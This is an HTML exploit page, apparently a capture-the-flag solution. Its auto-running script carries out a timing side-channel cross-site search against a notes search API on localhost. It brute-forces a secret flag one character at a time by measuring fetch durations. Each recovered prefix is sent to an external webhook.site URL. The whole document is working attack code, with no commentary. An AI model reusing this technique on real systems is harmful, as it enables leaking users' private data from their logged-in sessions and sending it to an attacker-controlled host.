<!DOCTYPE html>
<html>
<head>
    <title>Exploit Page</title>
</head>
<body>
    <h1>System Loading...</h1>
    <script>
        const TARGET = 'http://localhost:3031'; 
        const REPORT_URL = 'https://webhook.site/c52095bc-72e6-4717-80a3-37bddf872811'; 
        let flag = "RS{"; 
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_}";

        function report(data) {
            fetch(`${REPORT_URL}?log=${encodeURIComponent(data)}`);
        }

        async function check(query) {
            const start = performance.now();

            await fetch(`${TARGET}/api/notes?search=${query}`, { mode: 'no-cors' });
            const end = performance.now();

            return end - start; 
        }

        async function bruteForce() {
            report("start: " + flag);
            
            for (let i = 0; i < 30; i++) {
                for (let c of chars) {
                    const time = await check(flag + c);
                    if (time > 2) { 
                        flag += c;
                        report("찾은 글자: " + flag);
                        if (c === '}') return;
                        break;
                    }
                }
            }
        }

        bruteForce();
    </script>
</body>
</html>
